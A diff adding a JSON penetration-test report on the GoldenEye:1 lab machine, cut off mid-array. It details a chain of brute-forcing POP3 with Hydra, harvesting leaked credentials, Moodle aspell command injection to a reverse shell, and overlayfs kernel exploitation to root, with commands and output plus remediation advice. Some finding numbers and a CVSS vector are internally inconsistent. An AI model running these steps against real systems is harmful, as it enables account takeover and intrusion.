@@ -1,0 +1,372 @@
+{
+  "meta": {
+    "report_title": "Vulnerability Assessment & Penetration Testing Report",
+    "target_system": "GoldenEye : 1",
+    "target_description": "Host Infrastructure, Mail & Web Application",
+    "assessment_type": "Black-Box External & Post-Exploitation Assessment",
+    "prepared_by": "Swapnesh Chogle — Manager",
+    "organization": "Company Pvt Ltd",
+    "assessment_window": "27 October 2026 – 02 November 2026",
+    "report_date": "02 November 2026",
+    "version": "2.1 (Final)",
+    "classification": "CONFIDENTIAL — For authorized recipients only",
+    "target_address": "192.168.56.103 (illustrative)",
+    "os": "Ubuntu 14.04.1 Linux Server — Web, Mail & LMS stack",
+    "application": "Severnaya Station Web Portal & Moodle LMS (/gnocertdir)",
+    "audit_type": "Black-Box Penetration Test (External, unauthenticated start)",
+    "objective": "Full-scope compromise — remote code execution, root access & flag capture",
+    "standards": "PTES · OWASP Testing Guide v4 · MITRE ATT&CK aligned",
+    "distribution": "Restricted — Named recipients only",
+    "legal_note": "This assessment was performed against an isolated, purpose-built target in a controlled host-only laboratory network with explicit authorization. All activity was confined to the agreed scope. No production systems, live data, or third-party assets were touched."
+  },
+  "version_history": [
+    {"version": "0.9", "date": "30 Oct 2026", "author": "Swapnesh Chogle", "description": "Initial draft — findings & evidence capture"},
+    {"version": "1.0", "date": "30 Oct 2026", "author": "Swapnesh Chogle", "description": "First final release"},
+    {"version": "2.0", "date": "31 Oct 2026", "author": "Swapnesh Chogle", "description": "Full reproduction steps & PoC for every finding; added cleartext-mail finding (VAPT-09) and Metasploit path"},
+    {"version": "2.1", "date": "31 Oct 2026", "author": "Swapnesh Chogle", "description": "Precision pass — kernel exploit edit pinned to line 143 (gcc→cc); Burp Decoder added to decode options"}
+  ],
+  "contacts": [
+    {"name": "Swapnesh Chogle", "role": "Manager", "email": "-", "organization": "-"}
+  ],
+  "test_team": {
+    "security_analyst": "Swapnesh Chogle",
+    "reviewed_by": "Reviewer Name"
+  },
+  "executive_summary": {
+    "introduction": "Company Pvt Ltd was engaged to perform a black-box penetration test against the GoldenEye:1 server, with the explicit objective of simulating a real-world external adversary, compromising the host, and obtaining root-level access. The assessment began with no prior knowledge of the system's accounts, configuration or internal architecture. This report presents the full results, a complete step-by-step exploitation path, supporting evidence and proof-of-concept, business impact, and prioritized remediation guidance.",
+    "objective": "The objective was to assess the target's resilience against unauthorized attack, to identify and demonstrate vulnerabilities threatening the confidentiality, integrity and availability of the system and its data, and to prove or disprove whether a remote attacker could achieve complete administrative (root) compromise. The report additionally provides remediation guidance for each issue.",
+    "summary_of_results": "The engagement resulted in full compromise of the target. The assessor chained information disclosure, weak credential practices and an application-layer command injection to gain remote code execution, then escalated to root via an unpatched kernel vulnerability and captured the objective flag at /root/.flag.txt. No zero-day exploits were required — the entire path relied on misconfiguration, information leakage, weak authentication and unpatched software, exactly the conditions found in real enterprise breaches.\n\nThe test identified 4 Critical, 3 High, 1 Medium and 1 Low risk findings, together with 2 informational observations.",
+    "overall_risk": "CRITICAL",
+    "overall_risk_rationale": "A remote, unauthenticated attacker can reach complete system compromise through a repeatable credential-and-injection chain. Immediate remediation of the Critical findings is required.",
+    "high_level_recommendation": "A structured remediation action plan should be created to eliminate all vulnerabilities reported here, prioritizing the four Critical findings — the Moodle command injection and the unpatched kernel in particular, as each individually enables system takeover. Security controls should be embedded into the system build, deployment and patch-management life cycle so that security is addressed proactively rather than as a one-off exercise. Instances reported are on a sampling basis; mitigations must be applied consistently across the estate."
+  },
+  "scope": {
+    "target": "GoldenEye:1 virtual machine (Ubuntu 14.04.1 Linux)",
+    "target_address": "Assigned via DHCP on an isolated host-only network (illustrative: 192.168.56.103)",
+    "in_scope_services": "All TCP/UDP services exposed by the host (web, SMTP, POP3/SSL, LMS)",
+    "objective": "Obtain root access and capture the flag in /root",
+    "constraints": "No Denial-of-Service testing; activity confined to the isolated lab network; no attacks outside the agreed target",
+    "testing_approach": "Black-box — the assessor began with zero credentials and zero internal knowledge"
+  },
+  "methodology": [
+    {"phase": "1. Reconnaissance", "activities": "Host discovery (netdiscover), full TCP port scan, service/version enumeration"},
+    {"phase": "2. Vulnerability Analysis", "activities": "Web inspection, client-side source review, credential analysis, version fingerprinting, image metadata analysis"},
+    {"phase": "3. Exploitation", "activities": "Credential brute-forcing, mailbox harvesting, lateral movement, OS command injection → RCE"},
+    {"phase": "4. Post-Exploitation", "activities": "Local enumeration, kernel privilege escalation, flag capture, impact assessment"},
+    {"phase": "5. Reporting", "activities": "Findings documented with evidence, risk rating, business impact and remediation"}
+  ],
+  "tools_used": "netdiscover, nmap, hydra, netcat (nc), curl / wget, browser developer tools, an HTML-entity decoder, exiftool / strings, searchsploit, the Metasploit Framework (moodle_cmd_exec), gcc / cc, and linuxprivchecker.py. All tooling is standard and available within Kali Linux.",
+  "severity_counts": {
+    "critical": 4,
+    "high": 3,
+    "medium": 1,
+    "low": 1,
+    "informational": 2
+  },
+  "findings": [
+    {
+      "id": "VAPT-01",
+      "title": "OS Command Injection → RCE (Moodle Aspell / PSpellShell)",
+      "severity": "CRITICAL",
+      "ease": "Moderate (requires LMS admin access, obtained earlier in the chain)",
+      "cwe": "CWE-78 — Improper Neutralization of Special Elements used in an OS Command",
+      "cve": "CVE-2013-3630 — Moodle PSpellShell spell-check path command execution",
+      "owasp": "A03:2021 — Injection",
+      "cvss": "9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) — indicative",
+      "affected": "Moodle LMS 2.2.3 at severnaya-station.com/gnocertdir",
+      "description": "Moodle 2.2.3 is end-of-life. Its TinyMCE HTML editor exposes a spell-checker configuration in which the administrator specifies the path to the aspell binary. With the PSpellShell engine selected, this value is concatenated into a shell command and executed without sanitization. Any actor who can set this field can execute arbitrary OS commands.",
+      "risk": "Successful exploitation grants remote code execution as the web-server user (www-data) — an interactive foothold, access to the web root and DB configuration, and a launch point for privilege escalation (VAPT-02), leading to full root compromise.",
+      "preconditions": "Moodle administrator credentials (via VAPT-04 / VAPT-06): admin : xWinter1995x!. Confirm version at /gnocertdir/admin/environment.php → 2.2.3.",
+      "steps": "1. Authenticate to Moodle as admin.\n2. Site administration → Plugins → Text editors → TinyMCE HTML editor.\n3. Set Spell engine to PSpellShell.\n4. Start a listener on the attacker host: nc -lvnp 4444.\n5. In the 'Path to aspell' field, enter the reverse-shell one-liner.\n6. Open any HTML-editor content area, type a word and click the spell-check button to trigger.",
+      "evidence": "Reverse shell received; command execution confirmed:\n$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n$ uname -a\nLinux ... 3.13.0-32-generic #57-Ubuntu ... x86_64",
+      "recommendation": "• Upgrade Moodle to a supported release; the 2.2.x branch is end-of-life with multiple known RCE issues.\n• Disable the PSpellShell / external-aspell integration, or hard-code the binary path to a fixed, non-configurable value.\n• Restrict LMS administrative access (MFA, IP allow-listing, least privilege).\n• Run the web application under a least-privilege account that cannot spawn arbitrary binaries.",
+      "references": "CVE-2013-3630 · CWE-78 · OWASP A03:2021 · Metasploit exploit/multi/http/moodle_cmd_exec"
+    },
+    {
+      "id": "VAPT-02",
+      "title": "Unpatched Kernel → Local Privilege Escalation (CVE-2015-1328)",
+      "severity": "CRITICAL",
+      "ease": "Easy (public, reliable exploit code)",
+      "cwe": "CWE-269 — Improper Privilege Management (also CWE-281)",
+      "cve": "CVE-2015-1328 — Linux overlayfs local privilege escalation",
+      "owasp": "A06:2021 — Vulnerable & Outdated Components",
+      "cvss": "7.8 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) — indicative",
+      "affected": "Ubuntu 14.04.1, Linux kernel 3.13.0-32-generic (end-of-life)",
+      "description": "The host runs an outdated kernel vulnerable to CVE-2015-1328. The overlayfs filesystem mishandled permission checks on file creation in the upper filesystem, allowing a local unprivileged user to gain root. linuxprivchecker.py flagged the host as vulnerable.",
+      "risk": "Any local user — including the www-data foothold from VAPT-01 — can escalate to root, taking complete control of the OS: all data, all accounts, persistence, and a network pivot.",
+      "preconditions": "",
+      "steps": "1. From the www-data shell, confirm the kernel: uname -a → 3.13.0-32-generic.\n2. On the attacker host: searchsploit overlayfs → Linux Kernel 3.13.0 < 3.19 overlayfs — EDB 37292.\n3. Transfer 37292.c to a writable dir on the target (e.g. /tmp) via HTTP + wget.\n4. Key step: the target has no gcc (the exploit's internal build of /tmp/ofs-lib.so fails with 'gcc: not found'). cc is present, so edit the exploit source — at line 143, where it calls system(\"gcc -fPIC -shared -o /tmp/ofs-lib.so ...\") — and replace gcc with cc.\n5. Compile and run.",
+      "evidence": "Root obtained and objective flag captured:\n# whoami\nroot\n# cat /root/.flag.txt\n568628e0d993b1973adc718237da6e93",
+      "recommendation": "• Patch the OS and migrate off the end-of-life Ubuntu release to a supported LTS; apply all kernel/package updates.\n• Enable managed/automated patching with SLAs for Critical vulnerabilities.\n• Remove build tooling (cc/gcc) from production hosts to raise the cost of on-target compilation.\n• Deploy host hardening and EDR to detect privilege-escalation behavior.",
+      "references": "CVE-2015-1328 · ExploitDB 37292 · CWE-269"
+    },
+    {
+      "id": "VAPT-03",
+      "title": "Weak, Brute-Forceable Credentials (No Account Lockout)",
+      "severity": "CRITICAL",
+      "ease": "Easy (standard wordlist, no lockout, cracked in seconds)",
+      "cwe": "CWE-307 — Improper Restriction of Excessive Authentication Attempts; CWE-521 — Weak Password Requirements",
+      "cve": "",
+      "owasp": "A07:2021 — Identification & Authentication Failures",
+      "cvss": "9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) — indicative",
+      "affected": "Dovecot POP3 on non-standard port 55007",
+      "description": "The mail service enforces no account-lockout or rate-limiting and accepts weak passwords. Using usernames obtained via information disclosure, a dictionary attack recovered multiple mailbox passwords within seconds. The mailboxes held further sensitive communications and credentials that drove the rest of the attack.",
+      "risk": "An attacker with one or more valid usernames trivially compromises mail accounts, exposing confidential communication and cascading credentials. Absence of lockout/throttling also enables password-spray at scale.",
+      "preconditions": "",
+      "steps": "Brute force each discovered username (no lockout observed):\n$ hydra -l boris   -P /usr/share/wordlists/fasttrack.txt -f 192.168.56.103 -s 55007 pop3\n$ hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f 192.168.56.103 -s 55007 pop3\n$ hydra -l doak    -P /usr/share/wordlists/fasttrack.txt -f 192.168.56.103 -s 55007 pop3\n# High-throughput variant with a username list\n$ hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt -t20 -I 192.168.56.103 -s 55007 pop3\nboris -> secret1!    natalya -> bird    doak -> goat",
+      "evidence": "Reading natalya's mailbox over POP3 leaked onward credentials and internal host details:\n$ nc 192.168.56.103 55007\nUSER natalya / PASS bird / RETR 2\nusername: xenia  password: RCP90rulez!\nURL: severnaya-station.com/gnocertdir",
+      "recommendation": "• Enforce a strong password policy (length, complexity, breached-password screening).\n• Implement account lockout / progressive delays and connection rate-limiting (e.g. fail2ban) on all auth services.\n• Enable monitoring and alerting on repeated failed authentication.\n• Do not rely on non-standard ports as a control (see VAPT-08).",
+      "references": "CWE-307 · CWE-521 · OWASP A07:2021"
+    },
+    {
+      "id": "VAPT-04",
+      "title": "Credential Reuse Enabling Lateral Movement",
+      "severity": "CRITICAL",
+      "ease": "Easy",
+      "cwe": "CWE-521 — Weak Password Requirements; CWE-522 — Insufficiently Protected Credentials",
+      "cve": "",
+      "owasp": "A07:2021 — Identification & Authentication Failures",
+      "cvss": "8.8 — indicative",
+      "affected": "Shared identities across the web portal, POP3 mail and Moodle LMS",
+      "description": "Credentials recovered from one service directly unlocked others, and identities were shared across services with no segmentation. A single compromised credential cascaded step-by-step from a low-value account to administrative access on a critical application.",
+      "risk": "Credential reuse collapses the effort for lateral movement: one low-value account leads to admin on a critical system. This is the mechanism that connected every other finding into full compromise.",
+      "preconditions": "",
+      "steps": "Chain each hop, carrying credentials harvested from the previous one:\n# 1) boris password from client-side JS (VAPT-05) also works on the web portal\n# 2) natalya mailbox -> xenia:RCP90rulez! -> log in to Moodle /gnocertdir\n$ echo \"192.168.56.103 severnaya-station.com\" | sudo tee -a /etc/hosts\n#    Moodle messaging thread names user 'doak'\n# 3) brute force doak -> goat -> read mailbox -> dr_doak:4England!\n$ nc 192.168.56.103 55007  ->  USER doak / PASS goat / RETR 1",
+      "evidence": "Successful authentication at each hop using credentials from the prior hop (cross-reference VAPT-03, VAPT-05, VAPT-06).",
+      "recommendation": "• Prohibit password reuse across accounts and services; screen against known-breached passwords.\n• Introduce centralized identity management (LDAP/AD/SSO) with consistent policy.\n• Deploy MFA on all user and administrative interfaces.\n• Segment identity domains so a non-privileged credential cannot unlock privileged systems.",
+      "references": "CWE-521 · CWE-522 · OWASP A07:2021"
+    },
+    {
+      "id": "VAPT-05",
+      "title": "Credential Disclosure in Client-Side JavaScript",
+      "severity": "HIGH",
+      "ease": "Easy (no authentication; visible in page source)",
+      "cwe": "CWE-615 — Information in Source Code Comments; CWE-200; CWE-798 — Hard-coded Credentials",
+      "cve": "",
+      "owasp": "A05:2021 — Security Misconfiguration",
+      "cvss": "7.5 — indicative",
+      "affected": "Apache HTTP :80 — terminal.js referenced by /sev-home/",
+      "description": "A publicly accessible JavaScript file contains a developer comment leaking an HTML-entity-encoded password for boris and naming a second user, natalya. HTML-entity 'encoding' offers no protection — it is trivially decoded.",
+      "risk": "An unauthenticated attacker obtains valid credentials and usernames simply by viewing page source, providing the initial foothold for the entire attack chain.",
+      "preconditions": "",
+      "steps": "1. Browse to http://192.168.56.103/; the page directs to /sev-home/.\n2. View source / fetch the referenced script and read the comment block.\n3. Decode the HTML entities (Burp Suite Decoder, CyberChef, the browser console, or mothereff.in).\n$ curl -s http://192.168.56.103/terminal.js | head\n//Boris, make sure you update your default password.\n//I encoded you p@ssword below...  &#73;&#110;&#118;...\n//BTW Natalya says she can break your codes\n# Decoded ->  boris : InvincibleHack3r",
+      "evidence": "Decoded credentials boris:InvincibleHack3r authenticated /sev-home/.",
+      "recommendation": "• Remove all credentials, secrets and sensitive comments from client-side code and source control.\n• Never store secrets in HTML/JS, hidden fields or cookies — treat all client-side content as attacker-visible.\n• Rotate any credential ever committed to client-side code; add pre-commit secret scanning.",
+      "references": "CWE-615 · CWE-200 · CWE-798 · OWASP A05:2021"
+    },
+    {
+      "id": "VAPT-06",
+      "title": "Sensitive Credentials Concealed in Image Metadata",
+      "severity": "HIGH",
+      "ease": "Moderate (requires locating the file; metadata read is trivial)",
+      "cwe": "CWE-312 — Cleartext Storage of Sensitive Information; CWE-200",
+      "cve": "",
+      "owasp": "A05:2021 — Security Misconfiguration (A02 — Cryptographic Failures)",
+      "cvss": "8.2 — indicative",
+      "affected": "Publicly reachable JPEG at /dir007key/for-007.jpg",
+      "description": "The Moodle administrator password was hidden, base64-encoded, in the EXIF ImageDescription field of a publicly accessible JPEG. Encoding and hiding is not encryption: the value is recovered in one step with standard tooling.",
+      "risk": "Recovery of the administrator credential grants full control of the Moodle application and, via VAPT-01, remote code execution on the host.",
+      "preconditions": "",
+      "steps": "1. As dr_doak, open 'My private files' and download s3cret.txt; it points to /dir007key/for-007.jpg.\n2. Download the image and read its metadata, then base64-decode.\n$ wget http://severnaya-station.com/dir007key/for-007.jpg\n$ exiftool for-007.jpg | grep -i description\nImage Description : eFdpbnRlcjE5OTV4IQ==\n# alternatively:  strings for-007.jpg | grep '=='\n$ echo 'eFdpbnRlcjE5OTV4IQ==' | base64 -d\nxWinter1995x!",
+      "evidence": "Decoded value xWinter1995x! authenticated the Moodle admin account.",
+      "recommendation": "• Never embed secrets in file metadata, notes, or any client-reachable location.\n• Strip EXIF/metadata from all published media as part of the publishing pipeline.\n• Store secrets in a dedicated secrets manager; rotate any exposed credential immediately.",
+      "references": "CWE-312 · CWE-200 · OWASP A05:2021 / A02:2021"
+    },
+    {
+      "id": "VAPT-07",
+      "title": "Weak / Default Password Practice",
+      "severity": "HIGH",
+      "ease": "Easy",
+      "cwe": "CWE-521 — Weak Password Requirements; CWE-1392 — Use of Default Credentials",
+      "cve": "",
+      "owasp": "A07:2021 — Identification & Authentication Failures",
+      "cvss": "7.3 — indicative",
+      "affected": "User and administrative accounts across all services",
+      "description": "Multiple accounts used weak, guessable or default passwords. A 'default' password flagged for rotation in a developer note (terminal.js) was never changed and remained a live login. Single-word mailbox passwords such as 'bird' and 'goat' fall to a basic dictionary instantly.",
+      "risk": "Weak and default passwords allow rapid account compromise and undermine every other access control. This root-cause weakness made VAPT-03 and VAPT-04 feasible.",
+      "preconditions": "",
+      "steps": "Demonstrated throughout the chain: the un-rotated 'default' password from terminal.js still authenticated the web portal, and single dictionary words authenticated mail accounts (see VAPT-03 Hydra output).",
+      "evidence": "Un-rotated default credential authenticated the web portal; dictionary words authenticated mail accounts.",
+      "recommendation": "• Enforce a strong password policy and mandatory rotation of all default/initial credentials before go-live.\n• Screen new passwords against breached-password and common-word lists.\n• Adopt MFA to reduce the impact of any single weak password.",
+      "references": "CWE-521 · CWE-1392 · OWASP A07:2021"
+    },
+    {
+      "id": "VAPT-08",
+      "title": "Cleartext Transmission of Credentials (POP3 without TLS)",
+      "severity": "MEDIUM",
+      "ease": "Moderate (requires a network position to intercept)",
+      "cwe": "CWE-319 — Cleartext Transmission of Sensitive Information",
+      "cve": "",
+      "owasp": "A02:2021 — Cryptographic Failures",
+      "cvss": "5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N) — indicative",
+      "affected": "Dovecot POP3 plaintext listener on port 55007 (a separate SSL listener exists on 55006)",
+      "description": "Mailbox authentication and message retrieval are available over an unencrypted POP3 listener on port 55007. Both the USER/PASS credentials and the message bodies — which themselves contain further plaintext credentials — traverse the network in cleartext. This was directly observable during testing via the netcat session used to read mail.",
+      "risk": "An attacker positioned on the network path (ARP spoofing, rogue switch port, compromised segment) can passively capture mailbox credentials and the sensitive credentials distributed inside email bodies, amplifying the credential-chain exposure in VAPT-03/VAPT-04 without any brute force.",
+      "preconditions": "",
+      "steps": "1. Confirm the plaintext listener accepts credentials with no TLS negotiation:\n$ nc 192.168.56.103 55007\n+OK Dovecot ready.\nUSER natalya  -> +OK\nPASS bird     -> +OK Logged in.\nLIST / RETR 2 -> message body (incl. xenia:RCP90rulez!) in cleartext\n# On a monitoring position the same exchange is recoverable:\n$ tcpdump -i eth0 -A 'tcp port 55007'\n# USER / PASS and full RETR message bodies visible in plaintext",
+      "evidence": "Successful plaintext authentication and cleartext retrieval of a message containing onward credentials, with no encryption in transit.",
+      "recommendation": "• Disable the plaintext POP3 listener; require POP3S/TLS (the SSL listener on 55006) or STARTTLS, and reject plaintext auth.\n• Do not distribute credentials inside email bodies; use an out-of-band secure channel or a secrets manager.\n• Enforce network segmentation and monitoring to limit interception opportunities.",
+      "references": "CWE-319 · OWASP A02:2021"
+    },
+    {
+      "id": "VAPT-09",
+      "title": "Information Disclosure via Service & Port Enumeration",
+      "severity": "LOW",
+      "ease": "Easy",
+      "cwe": "CWE-200 — Information Exposure",
+      "cve": "",
+      "owasp": "A05:2021 — Security Misconfiguration",
+      "cvss": "3.7 — indicative",
+      "affected": "Apache :80, Postfix :25, Dovecot :55006/:55007",
+      "description": "Mail services were relocated to non-standard high ports as 'security by obscurity.' Port scanning identified them immediately, and service banners disclosed software and versions, aiding targeting. Obscurity is not a control.",
+      "risk": "Low direct impact, but the disclosed service map and versions materially reduce attacker effort and must not be relied upon as protection.",
+      "preconditions": "",
+      "steps": "Run a full service/version scan:\n$ nmap -p- -sV -sC 192.168.56.103\n25/tcp    open  smtp     Postfix smtpd\n80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))\n55006/tcp open  ssl/pop3 Dovecot pop3d (SSL)\n55007/tcp open  pop3     Dovecot pop3d",
+      "evidence": "Relocated mail services on 55006/55007 enumerated trivially; versions fingerprinted.",
+      "recommendation": "• Treat obscurity as defense-in-depth only, never a primary control — pair with real authentication hardening (VAPT-03).\n• Suppress or minimize version banners where supported.\n• Expose only required services; firewall the rest.",
+      "references": "CWE-200 · OWASP A05:2021"
+    }
+  ],
+  "attack_narrative": [
+    {
+      "step": "1 — Host discovery & port scan",
+      "phase": "Recon",
+      "description": "Discover the live host, then enumerate every TCP port and service version.",
+      "commands": "# Layer-2 host discovery\n$ netdiscover -r 192.168.56.0/24\n  192.168.56.103   08:00:27:xx:xx:xx   PCS Systemtechnik GmbH\n# Full TCP port + service/version + default scripts\n$ nmap -p- -sV -A 192.168.56.103\n  25/tcp    open  smtp     Postfix smtpd\n  80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))\n  55006/tcp open  ssl/pop3 Dovecot pop3d (SSL)\n  55007/tcp open  pop3     Dovecot pop3d"
+    },
+    {
+      "step": "2 — Web review → first credentials",
+      "phase": "Information disclosure",
+      "description": "Port 80 directs users to /sev-home/ (HTTP Basic auth). Page source behind the terminal animation exposes terminal.js, which leaks an HTML-entity-encoded password for boris and names natalya.",
+      "commands": "$ curl -s http://192.168.56.103/terminal.js\n  //Boris, make sure you update your default password.\n  //I encoded you p@ssword below...  &#73;&#110;&#118;...\n  //BTW Natalya says she can break your codes\n# Decode HTML entities (Burp Decoder / mothereff.in) ->\n  boris : InvincibleHack3r"
+    },
+    {
+      "step": "3 — Brute-force POP3 & read mail",
+      "phase": "Credential access",
+      "description": "With two usernames and no lockout, Hydra recovers mailbox passwords in seconds; mail is read in cleartext over POP3 with netcat.",
+      "commands": "$ hydra -l boris   -P /usr/share/wordlists/fasttrack.txt -f 192.168.56.103 -s 55007 pop3\n$ hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f 192.168.56.103 -s 55007 pop3\n  login: boris     password: secret1!\n  login: natalya   password: bird\n$ nc 192.168.56.103 55007\n  USER natalya / PASS bird / LIST / RETR 2\n  username: xenia   password: RCP90rulez!\n  URL: severnaya-station.com/gnocertdir"
+    },
+    {
+      "step": "4 — Lateral movement into Moodle",
+      "phase": "Lateral movement",
+      "description": "Credentials from mail unlock Moodle; further mail reveals admin path.",
+      "commands": "$ echo \"192.168.56.103 severnaya-station.com\" | sudo tee -a /etc/hosts\n# Log in to Moodle /gnocertdir as xenia : RCP90rulez!\n# Internal messaging reveals another user: doak\n$ hydra -l doak -P /usr/share/wordlists/fasttrack.txt -f 192.168.56.103 -s 55007 pop3\n  login: doak   password: goat\n$ nc 192.168.56.103 55007  ->  USER doak / PASS goat / RETR 1\n  Moodle login:  dr_doak : 4England!"
+    },
+    {
+      "step": "5 — Recover admin credential from image metadata",
+      "phase": "Credential access",
+      "description": "Private file points to a JPEG containing base64-encoded admin password in EXIF.",
+      "commands": "$ wget http://severnaya-station.com/dir007key/for-007.jpg\n$ exiftool for-007.jpg | grep -i description\n  Image Description : eFdpbnRlcjE5OTV4IQ==\n$ echo 'eFdpbnRlcjE5OTV4IQ==' | base64 -d\n  xWinter1995x!"
+    },
+    {
+      "step": "6 — Admin → Remote Code Execution",
+      "phase": "Execution",
+      "description": "Moodle 2.2.3 is exploitable through the TinyMCE spell-checker. A reverse shell returns as www-data.",
+      "commands": "$ id\n  uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+    },
+    {
+      "step": "7 — www-data → root",
+      "phase": "Privilege escalation",
+      "description": "The host runs Ubuntu 14.04.1 / kernel 3.13 — vulnerable to CVE-2015-1328 (overlayfs). Public exploit compiled on-target (gcc → cc).",
+      "commands": "# whoami\n  root\n# cat /root/.flag.txt\n  568628e0d993b1973adc718237da6e93"
+    }
+  ],
+  "business_impact": {
+    "summary": "Successful exploitation resulted in complete compromise of the target. An attacker following this chain could:\n\n- Read, modify or delete all data on the server, including application databases and configuration.\n- Access confidential internal communications and harvested credentials.\n- Use the compromised host as a pivot for further attacks across the internal network.\n- Install persistent backdoors and maintain long-term covert access.\n- Disrupt services or exfiltrate sensitive information at will.\n\nThe credential chain shows how a single leaked password cascades through an environment, ultimately granting administrative control of a critical application and root on the underlying host. In production this maps to loss of customer/employee data, regulatory exposure, reputational damage and operational disruption.",
+    "cia": "Confidentiality — High · Integrity — High · Availability — High."
+  },
+  "owasp_coverage": [
+    {"id": "A01", "name": "Broken Access Control", "status": "SAFE", "related": "—"},
+    {"id": "A02", "name": "Cryptographic Failures", "status": "UNSAFE", "related": "VAPT-06, VAPT-09"},
+    {"id": "A03", "name": "Injection", "status": "UNSAFE", "related": "VAPT-01 (OS command injection → RCE)"},
+    {"id": "A04", "name": "Insecure Design", "status": "UNSAFE", "related": "VAPT-04, VAPT-08 (reuse, obscurity-as-control)"},
+    {"id": "A05", "name": "Security Misconfiguration", "status": "UNSAFE", "related": "VAPT-05, VAPT-06, VAPT-08"},
+    {"id": "A06", "name": "Vulnerable & Outdated Components", "status": "UNSAFE", "related": "VAPT-01 (Moodle 2.2.3 EOL), VAPT-02 (EOL kernel)"},
+    {"id": "A07", "name": "Identification & Authentication Failures", "status": "UNSAFE", "related": "VAPT-03, VAPT-04, VAPT-07"},
+    {"id": "A08", "name": "Software & Data Integrity Failures", "status": "SAFE", "related": "—"},
+    {"id": "A09", "name": "Security Logging & Monitoring Failures", "status": "UNSAFE", "related": "VAPT-03 (brute force undetected)"},
+    {"id": "A10", "name": "Server-Side Request Forgery (SSRF)", "status": "SAFE", "related": "—"}
+  ],
+  "cwe_coverage": [
+    {"id": "CWE-78", "name": "OS Command Injection", "status": "UNSAFE", "finding": "VAPT-01"},
+    {"id": "CWE-269", "name": "Improper Privilege Management", "status": "UNSAFE", "finding": "VAPT-02"},
+    {"id": "CWE-287 / 307", "name": "Improper Authentication / Excessive Auth Attempts", "status": "UNSAFE", "finding": "VAPT-03"},
+    {"id": "CWE-522 / 521", "name": "Insufficiently Protected / Weak Credentials", "status": "UNSAFE", "finding": "VAPT-04, VAPT-07"},
+    {"id": "CWE-200", "name": "Exposure of Sensitive Information", "status": "UNSAFE", "finding": "VAPT-05, VAPT-08"},
+    {"id": "CWE-312", "name": "Cleartext Storage of Sensitive Information", "status": "UNSAFE", "finding": "VAPT-06"},
+    {"id": "CWE-319", "name": "Cleartext Transmission of Sensitive Information", "status": "UNSAFE", "finding": "VAPT-09"},
+    {"id": "CWE-79", "name": "Cross-site Scripting", "status": "SAFE", "finding": "Not found in scope"},
+    {"id": "CWE-89", "name": "SQL Injection", "status": "SAFE", "finding": "Not found in scope"},
+    {"id": "CWE-434", "name": "Unrestricted Upload of Dangerous File Type", "status": "NA", "finding": "Not applicable"}
+  ],
+  "remediation_roadmap": {
+    "immediate": [
+      "Rotate every credential exposed during the assessment (boris, natalya, doak, dr_doak, xenia, admin) and any sharing the same values.",
+      "Upgrade Moodle off the end-of-life 2.2.x branch and disable the Aspell/PSpellShell external-path integration (VAPT-01).",
+      "Patch the operating system; migrate to a supported Ubuntu LTS and apply all kernel updates (VAPT-02).",
+      "Enforce strong password policy with account lockout and rate limiting on web, mail and LMS (VAPT-03, VAPT-07).",
+      "Remove secrets from client-side code and file metadata; add secret scanning to the pipeline (VAPT-05, VAPT-06)."
+    ],
+    "medium_term": [
+      "Introduce centralized identity management (LDAP/AD/SSO) to eliminate credential sprawl and reuse (VAPT-04).",
+      "Deploy multi-factor authentication on all administrative interfaces (Moodle admin, SSH, mail).",
+      "Disable plaintext POP3; enforce POP3S/TLS and stop distributing credentials inside email bodies (VAPT-09).",
+      "Strip EXIF/metadata from all published media automatically.",
+      "Implement logging, alerting and brute-force detection (fail2ban / SIEM); conduct regular scans and pentests."
+    ],
+    "long_term": [
+      "Adopt a least-privilege model for service accounts (the web server must not execute arbitrary binaries).",
+      "Implement network segmentation to limit lateral movement.",
+      "Establish a patch-management program with defined SLAs for Critical vulnerabilities.",
+      "Embed security into the SDLC and build/deployment life cycle."
+    ]
+  },
+  "secure_coding_guidelines": [
+    "Validate all input at the server to prevent injection attacks (SQLi, OS command injection, XSS, LDAP injection).",
+    "Prefer whitelists to blacklists (range, length, format); blacklists go stale as new attacks emerge.",
+    "Escape special characters and never pass user/config input into a shell unescaped.",
+    "Use prepared statements / parameterized queries for all database access.",
+    "Never store secrets in source code, hidden fields, cookies or file metadata. Treat all client-reachable content as public.",
+    "Use strong, random session tokens and anti-CSRF tokens on state-changing requests.",
+    "Store passwords as salted hashes (bcrypt/argon2); never encode-and-hide.",
+    "Enforce strong password policy, account lockout and rate limiting; rotate default credentials before go-live.",
+    "Use TLS for all sensitive data in transit; disable plaintext protocols; set HttpOnly, Secure and Path on cookies.",
+    "Use cache-control directives on sensitive pages, and Autocomplete=OFF on credential fields.",
+    "Invalidate sessions on logout and on suspicious events; log security-relevant failures with timestamp, user ID and source IP.",
+    "Do not hard-code database or service passwords; use a secrets manager.",
+    "Use standard, vetted crypto libraries — never roll your own.",
+    "Handle exceptions with try/catch/finally, release resources, and serve generic custom error pages.",
+    "Keep components current; remove build tooling and unused services from production hosts.",
+    "Train developers in secure coding and verify adoption through code review and testing."
+  ],
+  "observations": [
+    {
+      "id": "OBS-1",
+      "observation": "The web application and /sev-home/ HTTP Basic auth are served over cleartext HTTP (no TLS), exposing content and credentials in transit.",
+      "recommendation": "Enforce HTTPS site-wide with HSTS; redirect all HTTP to HTTPS."
+    },
+    {
+      "id": "OBS-2",
+      "observation": "Service version banners (Apache 2.4.7, Postfix, Dovecot) are disclosed, aiding fingerprinting and targeted exploitation.",
+      "recommendation": "Minimize/suppress banners and the Server header where supported."
+    }
+  ],
+  "abbreviations": [
+    {"term": "VAPT", "definition": "Vulnerability Assessment & Penetration Testing"},
+    {"term": "RCE", "definition": "Remote Code Execution"},
+    {"term": "LPE", "definition": "Local Privilege Escalation"},
+    {"term": "LMS", "definition": "Learning Management System (Moodle)"},
+    {"term": "POP3 / POP3S", "definition": "Post Office Protocol v3 (plaintext / SSL-TLS)"},
+    {"term": "EXIF", "definition": "Exchangeable Image File Format (image metadata)"},
